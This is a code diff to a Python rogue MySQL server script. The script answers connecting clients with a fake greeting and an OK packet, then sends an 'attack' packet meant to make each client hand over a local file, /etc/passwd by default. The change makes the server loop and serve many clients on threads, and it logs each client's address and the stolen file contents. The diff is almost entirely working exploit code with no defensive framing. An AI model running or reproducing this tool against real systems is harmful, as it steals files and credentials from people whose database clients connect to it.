@@ -3,6 +3,8 @@ import random
 import binascii
 import struct
 import os
+from threading import Thread
+
 
 def rand_str(num):
     up = "FF" * num
@@ -15,28 +17,20 @@ def str_hex(string):
 
 
 class mysql:
-    def __init__(self, addrress, port = 3306, count = 1, file="/etc/passwd"):
-        self.info = (addrress, port)
+    def __init__(self, addrress, port = 3306, count = 10, file="/etc/passwd"):
+        self.addrress = addrress
+        self.port = port
         self.count = count
         self.file = file
     def start(self):
         ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        ss.bind((self.info))
+        ss.bind((self.addrress, self.port))
         ss.listen(self.count)
-        conn, addr = ss.accept()
-        data = self.greet()
-        # print(str_hex(data))
-        conn.send(data)
-        conn.recv(1024)
-        data = self.resp_ok()
-        # print(str_hex(data))
-        conn.send(data)
-        conn.recv(1024)
-        data = self.attack()
-        # print(str_hex(data))
-        conn.send(data)
-        print(conn.recv(1024))
-        conn.close()
+        while True:
+            conn, addr = ss.accept()
+            t = Thread(target = self.main, args = (conn, addr))
+            t.start()
+
     def greet(self):
         pck_num = b"\x00"
         protocol = b"\x0a"
@@ -78,6 +72,23 @@ class mysql:
         length = struct.pack("i", len(data))[:3]
 
         return length + pck_num + data
+    def main(self, conn, addr):
+        data = self.greet()
+        # print(str_hex(data))
+        conn.send(data)
+        conn.recv(1024)
+        data = self.resp_ok()
+        # print(str_hex(data))
+        conn.send(data)
+        conn.recv(1024)
+        data = self.attack()
+        # print(str_hex(data))
+        conn.send(data)
+        print("*" * 88)
+        print("addr: ", addr)
+        print(conn.recv(1024))
+        print("*" * 88)
+        conn.close()
 
 
 if "__name__" == "__main__":
